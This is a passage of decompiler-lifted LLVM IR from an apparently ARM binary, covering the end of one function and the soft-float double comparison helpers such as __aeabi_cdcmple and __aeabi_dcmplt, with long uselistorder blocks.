  br label %dec_label_pc_1af54

dec_label_pc_1af40:                               ; preds = %dec_label_pc_1af38
  %v4_1af40 = mul i32 %arg3, 4096
  %v5_1af40 = or i32 %v4_1af40, %arg4
  store i32 %v5_1af40, i32* %r5.global-to-local, align 4
  %v7_1af40 = icmp eq i32 %v5_1af40, 0
  call void @__pseudo_cond_branch(i1 %v7_1af40, i32 ptrtoint (i32* @global_var_1ad00.1403 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1af50 = call i32 @function_1ad64(i32 %arg3, i32 %arg4)
  store i32 %v2_1af50, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1af54

dec_label_pc_1af54:                               ; preds = %dec_label_pc_1af38.dec_label_pc_1af54_crit_edge, %dec_label_pc_1af40
  %v1_1af54 = phi i32 [ %v1_1af54.pre, %dec_label_pc_1af38.dec_label_pc_1af54_crit_edge ], [ %v2_1af50, %dec_label_pc_1af40 ]
  %v0_1af54 = load i32, i32* @r1, align 4
  %v3_1af54 = mul i32 %v1_1af54, 2
  %v4_1af54 = or i32 %v3_1af54, %v0_1af54
  store i32 %v4_1af54, i32* %r6.global-to-local, align 4
  %v6_1af54 = icmp eq i32 %v4_1af54, 0
  br i1 %v6_1af54, label %dec_label_pc_1af54._crit_edge, label %bb114

dec_label_pc_1af54._crit_edge:                    ; preds = %dec_label_pc_1af54
  %.pre = mul i32 %arg3, 2
  %.pre80 = or i32 %.pre, %arg4
  br label %bb115

bb114:                                            ; preds = %dec_label_pc_1af54
  %v4_1af58 = mul i32 %arg3, 2
  %v5_1af58 = or i32 %v4_1af58, %arg4
  store i32 %v5_1af58, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_1af58, 0
  br label %bb115

bb115:                                            ; preds = %dec_label_pc_1af54._crit_edge, %bb114
  %v4_1af68.pre-phi = phi i32 [ %.pre80, %dec_label_pc_1af54._crit_edge ], [ %v5_1af58, %bb114 ]
  %v0_1af5c = phi i1 [ false, %dec_label_pc_1af54._crit_edge ], [ %phitmp, %bb114 ]
  call void @__pseudo_cond_branch(i1 %v0_1af5c, i32 ptrtoint (i32* @global_var_1ac98.1404 to i32))
  %v0_1af60 = load i32, i32* @r1, align 4
  %v1_1af60 = load i32, i32* %r0.global-to-local, align 4
  %v3_1af60 = mul i32 %v1_1af60, 2
  %v4_1af60 = or i32 %v3_1af60, %v0_1af60
  store i32 %v4_1af60, i32* %r4.global-to-local, align 4
  %v1_1af64 = icmp ne i32 %v4_1af60, 0
  call void @__pseudo_cond_branch(i1 %v1_1af64, i32 ptrtoint (i32* @global_var_1ad4c.1402 to i32))
  store i32 %v4_1af68.pre-phi, i32* %r5.global-to-local, align 4
  %v1_1af6c = icmp ne i32 %v4_1af68.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_1af6c, i32 ptrtoint (i32* @global_var_1ad00.1403 to i32))
  %v0_1af70 = load i32, i32* %r0.global-to-local, align 4
  %v1_1af70 = load i32, i32* @r1, align 4
  %v2_1af70 = call i32 @function_1ad64(i32 %v0_1af70, i32 %v1_1af70)
  store i32 %v2_1af70, i32* %r0.global-to-local, align 4
  ret i32 %v2_1af70

; uselistorder directives
  uselistorder i32 %v5_1af58, { 1, 0, 2 }
  uselistorder i32 %v1_1af14, { 1, 0 }
  uselistorder i32 %v10_1aee0, { 2, 0, 1 }
  uselistorder i32 %v6_1aedc, { 3, 4, 0, 1, 2, 6, 5, 7 }
  uselistorder i32 %v5_1aed8, { 1, 0, 2 }
  uselistorder i32 %v2_1aec0, { 1, 0, 2 }
  uselistorder i32 %v1_1aec0, { 1, 0, 2 }
  uselistorder i32 %v1_1aebc, { 1, 0, 2 }
  uselistorder i32 %v0_1aebc, { 1, 0, 2 }
  uselistorder i1 %v7_1aeb0, { 1, 0 }
  uselistorder i32 %v2_1ae94, { 1, 0 }
  uselistorder i32 %v3_1ae80, { 2, 1, 0 }
  uselistorder i32 %v3_1ae74, { 0, 2, 1 }
  uselistorder i32 %v5_1ae70, { 2, 0, 1 }
  uselistorder i32 %v6_1ae60, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1ae4c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1ae48, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1ae54, { 0, 2, 1 }
  uselistorder i32 %v1_1ae60, { 1, 0 }
  uselistorder i32 %v6_1ae44, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1ae30, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1ae2c, { 0, 2, 1 }
  uselistorder i32 %v0_1ae38, { 0, 2, 1 }
  uselistorder i32 %v1_1ae44, { 1, 0 }
  uselistorder i32 %v6_1ae28, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1ae14, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1ae1c, { 0, 2, 1 }
  uselistorder i32 %v1_1ae28, { 1, 0 }
  uselistorder i32 %v3_1ae0c, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1ae00, { 1, 2, 0 }
  uselistorder i32 %v3_1ae8013, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1ae7c17, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1ae00, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1ae0c, { 1, 0 }
  uselistorder i32 %storemerge136, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1aea8.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1adec, { 1, 0 }
  uselistorder i32 %v0_1adf0, { 1, 0 }
  uselistorder i32 %v3_1addc, { 1, 0 }
  uselistorder i1 %v1_1add0, { 1, 0 }
  uselistorder i32 %v3_1adc0, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1adbc, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1adb4, { 2, 1, 0 }
  uselistorder i32 %v5_1adb0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1ad90, { 1, 5, 6, 4, 2, 3, 0, 7, 10, 9, 8, 11 }
  uselistorder i32 %v6_1ad80, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1ad80, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_1ad7c, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_1ad7c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_1ad70, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 6, 7, 1, 3, 4, 5, 8, 2 }
  uselistorder i32* %r0.global-to-local, { 7, 8, 9, 3, 12, 10, 11, 13, 5, 6, 4, 14, 2, 15, 16, 19, 17, 18, 20, 21, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 9, 6, 7, 8, 0, 1, 2, 3, 4, 5, 10 }
  uselistorder i32 (i32, i32)* @function_1ad64, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_1abe8, { 1, 0 }
  uselistorder i1* @cpsr_n, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 1024, { 3, 12, 13, 14, 0, 1, 10, 8, 4, 9, 2, 5, 6, 7, 11 }
  uselistorder i32 -1023, { 2, 0, 1, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 2, 1, 14, 15, 16, 17, 20, 21, 23, 24, 25, 26, 27, 31, 29, 30, 28, 18, 19, 0, 22, 3 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 6, 5, 1 }
  uselistorder i32 16, { 1, 6, 4, 5, 7, 8, 28, 9, 10, 2, 11, 12, 93, 94, 95, 96, 97, 98, 99, 100, 0, 101, 102, 13, 14, 103, 104, 15, 105, 106, 107, 108, 16, 112, 30, 17, 72, 73, 113, 114, 36, 37, 38, 118, 39, 119, 120, 40, 121, 122, 41, 123, 124, 125, 126, 127, 128, 74, 75, 76, 77, 89, 90, 78, 79, 80, 81, 109, 42, 82, 33, 60, 43, 57, 68, 58, 115, 116, 129, 31, 83, 84, 85, 86, 87, 88, 53, 110, 111, 59, 18, 19, 20, 21, 22, 29, 23, 24, 3, 25, 26, 34, 44, 45, 61, 62, 63, 46, 64, 65, 47, 66, 67, 54, 55, 48, 56, 69, 32, 35, 70, 71, 49, 91, 27, 50, 51, 92, 52, 117 }
  uselistorder i32 8, { 3, 4, 5, 6, 7, 8, 71, 72, 30, 9, 10, 21, 11, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 0, 1, 140, 141, 142, 143, 144, 12, 145, 80, 65, 66, 73, 146, 147, 153, 154, 29, 155, 156, 27, 96, 160, 170, 56, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 13, 58, 106, 38, 107, 108, 74, 127, 128, 109, 148, 149, 150, 187, 31, 81, 14, 92, 94, 82, 83, 55, 164, 163, 161, 162, 157, 158, 159, 165, 166, 167, 15, 168, 169, 2, 186, 61, 62, 59, 60, 23, 24, 35, 36, 63, 188, 110, 111, 112, 75, 113, 114, 115, 116, 28, 117, 68, 69, 118, 119, 120, 64, 121, 122, 123, 124, 34, 25, 26, 125, 126, 70, 151, 152, 84, 16, 17, 76, 32, 18, 19, 22, 20, 85, 86, 87, 88, 89, 90, 91, 33, 54, 77, 53, 50, 51, 52, 49, 47, 48, 46, 44, 45, 43, 42, 40, 41, 78, 79, 39, 67, 37, 93, 95, 129 }
  uselistorder i32 4, { 8, 9, 170, 216, 217, 171, 10, 11, 272, 273, 274, 275, 276, 94, 108, 109, 110, 277, 278, 279, 280, 281, 282, 283, 0, 12, 74, 284, 285, 286, 287, 288, 289, 290, 72, 291, 111, 112, 113, 292, 294, 95, 295, 83, 296, 13, 14, 1, 195, 218, 219, 220, 298, 299, 96, 300, 301, 221, 222, 302, 303, 97, 114, 115, 116, 117, 118, 119, 304, 120, 121, 305, 306, 98, 122, 15, 223, 16, 93, 84, 85, 17, 328, 86, 76, 18, 19, 87, 88, 329, 330, 331, 332, 89, 333, 334, 335, 336, 90, 337, 338, 339, 340, 341, 20, 342, 343, 344, 345, 346, 91, 75, 347, 348, 349, 350, 351, 352, 21, 22, 92, 224, 225, 226, 227, 99, 228, 229, 230, 231, 232, 73, 233, 234, 235, 257, 236, 297, 237, 353, 354, 355, 357, 358, 123, 124, 125, 259, 260, 261, 262, 23, 184, 126, 185, 127, 77, 186, 200, 128, 201, 202, 2, 210, 211, 212, 213, 129, 130, 187, 131, 3, 132, 188, 24, 189, 78, 133, 134, 315, 317, 316, 313, 314, 307, 308, 309, 310, 318, 319, 320, 311, 312, 135, 136, 137, 138, 321, 322, 323, 324, 325, 326, 4, 25, 327, 139, 140, 356, 238, 26, 27, 28, 29, 5, 293, 30, 141, 60, 31, 32, 142, 33, 143, 144, 145, 146, 147, 239, 34, 240, 148, 241, 242, 243, 244, 245, 246, 247, 149, 248, 249, 250, 251, 252, 253, 61, 256, 150, 151, 255, 172, 254, 35, 36, 80, 37, 38, 81, 269, 270, 173, 39, 40, 62, 63, 64, 41, 190, 42, 43, 65, 44, 45, 152, 46, 191, 192, 100, 193, 194, 197, 196, 198, 199, 82, 66, 153, 154, 155, 156, 157, 174, 158, 159, 102, 175, 103, 47, 160, 101, 48, 176, 177, 178, 179, 180, 181, 182, 107, 49, 50, 79, 203, 204, 205, 206, 207, 208, 209, 214, 161, 67, 68, 51, 215, 52, 53, 104, 69, 162, 105, 163, 70, 164, 165, 54, 258, 55, 56, 57, 263, 264, 265, 266, 267, 268, 271, 71, 166, 58, 59, 167, 168, 169, 6, 7, 106, 183 }
  uselistorder i32 32, { 58, 59, 60, 61, 28, 29, 36, 49, 50, 31, 62, 30, 37, 63, 64, 65, 66, 34, 67, 80, 81, 82, 0, 83, 84, 51, 85, 86, 87, 88, 89, 90, 91, 92, 93, 38, 39, 32, 68, 45, 20, 69, 78, 54, 55, 4, 3, 6, 5, 8, 7, 1, 33, 70, 19, 71, 2, 46, 72, 73, 74, 75, 76, 21, 77, 52, 53, 79, 41, 40, 35, 56, 10, 9, 22, 42, 47, 57, 23, 12, 11, 14, 13, 24, 25, 16, 15, 26, 43, 44, 18, 17, 27, 48 }
  uselistorder i32 33, { 4, 5, 6, 2, 7, 8, 9, 1, 0, 3 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 16777216, { 1, 2, 0, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 39, 37, 40, 38, 43, 41, 44, 42, 46, 45 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 140, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 141, 35, 36, 37, 42, 38, 39, 41, 40, 43, 44, 45, 47, 46, 48, 49, 50, 0, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 133, 79, 80, 137, 81, 138, 82, 139, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 134, 1, 95, 96, 99, 98, 97, 102, 101, 100, 103, 104, 105, 106, 107, 132, 112, 108, 109, 113, 110, 111, 135, 114, 116, 115, 117, 118, 119, 122, 120, 121, 123, 124, 125, 126, 127, 128, 129, 130, 131, 136 }
  uselistorder i32 1048576, { 19, 0, 1, 2, 20, 21, 13, 3, 4, 5, 22, 6, 7, 23, 24, 14, 15, 8, 9, 25, 26, 27, 18, 28, 10, 16, 11, 17, 12 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 13, 43, 44, 45, 46, 47, 48, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 10, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 1, 0, 17, 18, 19, 20, 21, 137, 2, 138, 139, 140, 147, 148, 149, 150, 151, 152, 153, 154, 155, 3, 11, 156, 157, 4, 158, 159, 160, 161, 162, 163, 5, 164, 165, 166, 167, 49, 6, 50, 51, 52, 168, 170, 169, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 186, 53, 54, 55, 56, 57, 58, 59, 96, 97, 60, 61, 62, 63, 7, 64, 65, 66, 67, 68, 69, 70, 196, 201, 34, 35, 22, 23, 24, 36, 37, 38, 39, 25, 26, 187, 184, 185, 188, 189, 8, 190, 191, 192, 193, 194, 195, 104, 12, 105, 106, 9, 71, 98, 99, 100, 101, 102, 103, 141, 142, 143, 144, 145, 146, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 14, 15, 16, 82, 83, 84, 85, 197, 198, 199, 200, 27, 28, 29, 30, 31, 32, 33, 40, 41, 42 }
  uselistorder i32* @r5, {}
  uselistorder i32 %arg4, { 8, 2, 7, 6, 9, 5, 4, 0, 1, 3, 10 }
  uselistorder i32 %arg3, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder label %bb115, { 1, 0 }
  uselistorder label %dec_label_pc_1af54, { 1, 0 }
  uselistorder label %dec_label_pc_1af38, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %dec_label_pc_1af04, { 3, 2, 1, 0 }
  uselistorder label %bb109, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1adfc, { 1, 0 }
  uselistorder label %dec_label_pc_1ade4, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_1af78 = call i32 @function_1af88()
  ret i32 %v0_1af78
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_1af80 = call i32 @function_1af88()
  ret i32 %v0_1af80

; uselistorder directives
  uselistorder i32 ()* @function_1af88, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_1af84 = load i32, i32* @r0, align 4
  ret i32 %v0_1af84
}

define i32 @function_1af88() local_unnamed_addr {
dec_label_pc_1af88:
  %v0_1af88 = load i32, i32* @ip, align 4
  %v0_1af8c = load i32, i32* @r0, align 4
  %v2_1af8c = mul i32 %v0_1af8c, 2
  %v2_1af8c.off = add i32 %v2_1af8c, 4194303
  %tmp = icmp ult i32 %v2_1af8c.off, 2097152
  %v0_1af94 = load i32, i32* @r2, align 4
  %v2_1af94 = mul i32 %v0_1af94, 2
  br i1 %tmp, label %dec_label_pc_1afe4, label %bb

bb:                                               ; preds = %dec_label_pc_1af88
  %v2_1af94.off = add i32 %v2_1af94, 4194303
  %tmp26 = icmp ult i32 %v2_1af94.off, 2097152
  br i1 %tmp26, label %dec_label_pc_1afd8, label %dec_label_pc_1afa0

dec_label_pc_1afa0:                               ; preds = %dec_label_pc_1afec, %dec_label_pc_1aff8, %bb
  %v0_1afa0 = load i32, i32* @r1, align 4
  %v4_1afa0 = or i32 %v0_1afa0, %v2_1af8c
  %v6_1afa0 = icmp eq i32 %v4_1afa0, 0
  br i1 %v6_1afa0, label %bb14, label %.thread

bb14:                                             ; preds = %dec_label_pc_1afa0
  %v1_1afa4 = load i32, i32* @r3, align 4
  %v5_1afa4 = or i32 %v1_1afa4, %v2_1af94
  %v7_1afa4 = icmp eq i32 %v5_1afa4, 0
  br i1 %v7_1afa4, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_1afa0, %bb14
  %v3_1afa8 = xor i32 %v0_1af94, %v0_1af8c
  %v5_1afa8 = icmp eq i32 %v3_1afa8, 0
  br i1 %v5_1afa8, label %.thread..thread1_crit_edge, label %.thread2.thread

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_1afac.pre = load i32, i32* @r3, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb14
  %v2_1afac = phi i32 [ %v2_1afac.pre, %.thread..thread1_crit_edge ], [ %v1_1afa4, %bb14 ]
  %v5_1afac = icmp eq i32 %v2_1afac, %v0_1afa0
  br i1 %v5_1afac, label %bb15, label %.thread1..thread2.thread_crit_edge

.thread1..thread2.thread_crit_edge:               ; preds = %.thread1
  %.pre24 = xor i32 %v0_1af94, %v0_1af8c
  br label %.thread2.thread

bb15:                                             ; preds = %.thread1
  ret i32 0

.thread2.thread:                                  ; preds = %.thread1..thread2.thread_crit_edge, %.thread
  %v2_1afbc.pre-phi = phi i32 [ %.pre24, %.thread1..thread2.thread_crit_edge ], [ %v3_1afa8, %.thread ]
  %v3_1afbc = icmp slt i32 %v2_1afbc.pre-phi, 0
  br i1 %v3_1afbc, label %..thread7_crit_edge, label %bb16

bb16:                                             ; preds = %.thread2.thread
  %v10_1afc0 = icmp eq i32 %v0_1af8c, %v0_1af94
  br i1 %v10_1afc0, label %bb17, label %bb18

bb17:                                             ; preds = %bb16
  %v2_1afc4 = load i32, i32* @r3, align 4
  %v4_1afc4 = icmp ult i32 %v0_1afa0, %v2_1afc4
  br i1 %v4_1afc4, label %..thread7_crit_edge, label %bb19

bb18:                                             ; preds = %bb16
  %v4_1afc0 = icmp ult i32 %v0_1af8c, %v0_1af94
  br i1 %v4_1afc0, label %..thread7_crit_edge, label %bb19

..thread7_crit_edge:                              ; preds = %bb17, %bb18, %.thread2.thread
  %.pre12 = ashr i32 %v0_1af94, 31
  br label %.thread7

bb19:                                             ; preds = %bb17, %bb18
  %v2_1afc8 = and i32 %v0_1af94, 1073741824
  %v3_1afc8 = icmp eq i32 %v2_1afc8, 0
  %v4_1afc8 = ashr i32 %v0_1af94, 31
  br i1 %v3_1afc8, label %.thread7, label %bb20

.thread7:                                         ; preds = %bb19, %..thread7_crit_edge
  %v4_1afcc.pre-phi = phi i32 [ %.pre12, %..thread7_crit_edge ], [ %v4_1afc8, %bb19 ]
  %v5_1afcc = sub nsw i32 -1, %v4_1afcc.pre-phi
  br label %bb20

bb20:                                             ; preds = %bb19, %.thread7
  %v0_1afd0 = phi i32 [ %v4_1afc8, %bb19 ], [ %v5_1afcc, %.thread7 ]
  %v1_1afd0 = or i32 %v0_1afd0, 1
  ret i32 %v1_1afd0

dec_label_pc_1afd8:                               ; preds = %bb
  br label %dec_label_pc_1afec

dec_label_pc_1afe4:                               ; preds = %dec_label_pc_1af88
  %v0_1afe4 = load i32, i32* @r1, align 4
  %v4_1afe4 = mul i32 %v0_1af8c, 4096
  %v5_1afe4 = or i32 %v0_1afe4, %v4_1afe4
  %v7_1afe4 = icmp eq i32 %v5_1afe4, 0
  br i1 %v7_1afe4, label %dec_label_pc_1afe4.dec_label_pc_1afec_crit_edge, label %dec_label_pc_1b000

dec_label_pc_1afe4.dec_label_pc_1afec_crit_edge:  ; preds = %dec_label_pc_1afe4
  %v2_1af94.off25 = add i32 %v2_1af94, 4194303
  %tmp27 = icmp ult i32 %v2_1af94.off25, 2097152
  br label %dec_label_pc_1afec

dec_label_pc_1afec:                               ; preds = %dec_label_pc_1afe4.dec_label_pc_1afec_crit_edge, %dec_label_pc_1afd8
  %v3_1aff0.pre-phi = phi i1 [ %tmp27, %dec_label_pc_1afe4.dec_label_pc_1afec_crit_edge ], [ true, %dec_label_pc_1afd8 ]
  br i1 %v3_1aff0.pre-phi, label %dec_label_pc_1aff8, label %dec_label_pc_1afa0

dec_label_pc_1aff8:                               ; preds = %dec_label_pc_1afec
  %v0_1aff8 = load i32, i32* @r3, align 4
  %v4_1aff8 = mul i32 %v0_1af94, 4096
  %v5_1aff8 = or i32 %v0_1aff8, %v4_1aff8
  %v7_1aff8 = icmp eq i32 %v5_1aff8, 0
  br i1 %v7_1aff8, label %dec_label_pc_1afa0, label %dec_label_pc_1b000

dec_label_pc_1b000:                               ; preds = %dec_label_pc_1afe4, %dec_label_pc_1aff8
  ret i32 %v0_1af88

; uselistorder directives
  uselistorder i32 %v4_1afc8, { 1, 0 }
  uselistorder i32 %v1_1afa4, { 1, 0 }
  uselistorder i32 %v0_1afa0, { 2, 0, 1 }
  uselistorder i32 %v2_1af94, { 0, 2, 1 }
  uselistorder i32 %v0_1af94, { 0, 5, 6, 4, 8, 7, 2, 3, 1 }
  uselistorder i32 %v2_1af8c, { 1, 0 }
  uselistorder i32 %v0_1af8c, { 0, 4, 5, 2, 3, 1 }
  uselistorder i32 1073741824, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 31, { 18, 7, 5, 12, 14, 19, 6, 20, 15, 4, 21, 2, 1, 0, 8, 10, 9, 11, 3, 22, 23, 16, 13, 17 }
  uselistorder i32* @r3, { 8, 9, 1, 10, 11, 12, 0, 13, 3, 14, 21, 2, 22, 23, 24, 15, 16, 25, 26, 17, 18, 19, 20, 4, 5, 27, 30, 28, 29, 6, 7, 31 }
  uselistorder i32* @r1, { 78, 79, 13, 80, 81, 82, 83, 84, 85, 14, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 29, 15, 30, 97, 31, 0, 4, 98, 12, 99, 100, 101, 102, 11, 103, 104, 105, 132, 133, 134, 135, 2, 136, 137, 138, 139, 140, 143, 141, 142, 16, 17, 32, 144, 145, 146, 147, 148, 149, 150, 151, 5, 153, 106, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 6, 55, 56, 20, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 8, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 7, 228, 229, 18, 126, 107, 108, 109, 110, 111, 112, 125, 113, 114, 127, 21, 25, 26, 230, 3, 231, 68, 69, 129, 37, 38, 233, 165, 170, 171, 174, 172, 173, 166, 167, 168, 169, 232, 70, 22, 175, 181, 131, 130, 234, 235, 236, 115, 116, 117, 23, 118, 176, 177, 178, 179, 180, 9, 71, 72, 10, 19, 119, 120, 121, 1, 122, 123, 124, 24, 28, 152, 65, 66, 27, 33, 34, 35, 36, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 57, 58, 59, 60, 61, 62, 63, 64, 67, 73, 74, 75, 76, 77, 128 }
  uselistorder i32* @ip, { 19, 20, 21, 6, 22, 23, 24, 25, 26, 27, 28, 15, 16, 3, 17, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 7, 8, 0, 9, 10, 11, 12, 13, 43, 44, 5, 41, 4, 42, 30, 31, 2, 32, 33, 29, 40, 90, 87, 88, 89, 1, 91, 14, 18, 34, 37, 36, 35, 38, 39 }
  uselistorder label %dec_label_pc_1b000, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %..thread7_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1afa0, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_1b008 = load i32, i32* @r0, align 4
  %v0_1b00c = load i32, i32* @r2, align 4
  store i32 %v0_1b00c, i32* @r0, align 4
  store i32 %v0_1b008, i32* @r2, align 4
  %v0_1b020 = call i32 @__aeabi_cdcmple()
  ret i32 %v0_1b020
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_1b024 = load i32, i32* @r0, align 4
  %v1_1b028 = sext i32 %v3_1b024 to i64
  %v2_1b028 = bitcast i64 %v1_1b028 to double
  %v3_1b028 = load i32, i32* @r2, align 4
  %v4_1b028 = sext i32 %v3_1b028 to i64
  %v5_1b028 = bitcast i64 %v4_1b028 to double
  %v7_1b028 = fcmp oeq double %v2_1b028, %v5_1b028
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_1b028 = fcmp ule double %v2_1b028, %v5_1b028
  %not.v7_1b028 = xor i1 %v7_1b028, true
  %v1_1b02c = and i1 %not.v6_1b028, %not.v7_1b028
  store i1 %v7_1b028, i1* @cpsr_z, align 1
  br i1 %v1_1b02c, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_1b028, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_1b024

; uselistorder directives
  uselistorder i1 %v7_1b028, { 1, 2, 0 }
  uselistorder i32* @r2, { 15, 27, 28, 64, 65, 66, 10, 67, 68, 69, 70, 71, 107, 12, 108, 109, 11, 110, 111, 112, 113, 13, 29, 30, 31, 114, 115, 116, 46, 6, 47, 119, 120, 122, 72, 123, 124, 126, 127, 128, 129, 48, 49, 14, 7, 141, 142, 143, 144, 90, 73, 74, 2, 75, 76, 77, 117, 118, 8, 91, 78, 16, 17, 145, 3, 146, 152, 153, 157, 147, 100, 41, 42, 148, 130, 134, 135, 138, 136, 137, 131, 132, 133, 99, 139, 154, 20, 50, 79, 80, 81, 125, 1, 155, 5, 156, 82, 83, 84, 85, 9, 86, 87, 4, 88, 0, 89, 121, 51, 52, 18, 19, 32, 149, 150, 151, 33, 34, 35, 36, 37, 38, 39, 40, 43, 44, 45, 53, 54, 55, 21, 22, 23, 24, 25, 26, 56, 57, 58, 59, 60, 61, 62, 63, 92, 93, 94, 95, 96, 97, 98, 101, 102, 103, 104, 105, 106, 140 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq() local_unnamed_addr {
entry:
  %v0_1b038 = load i32, i32* @lr, align 4
  %v0_1b03c = call i32 @__aeabi_cdcmple()
  %v0_1b040 = load i1, i1* @cpsr_z, align 1
  %.v0_1b03c. = zext i1 %v0_1b040 to i32
  call void @__pseudo_branch(i32 %v0_1b038)
  ret i32 %.v0_1b03c.
}

define i32 @__aeabi_dcmplt() local_unnamed_addr {
entry:
  %v0_1b04c = load i32, i32* @lr, align 4
  %v0_1b050 = call i32 @__aeabi_cdcmple()
  %v0_1b054 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1b054 to i32
  %.v0_1b050. = xor i32 %tmp2, 1
  call void @__pseudo_branch(i32 %v0_1b04c)
  ret i32 %.v0_1b050.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1b060 = load i32, i32* @lr, align 4
  store i32 %v0_1b060, i32* %stack_var_-8, align 4
  %v0_1b064 = call i32 @__aeabi_cdcmple()
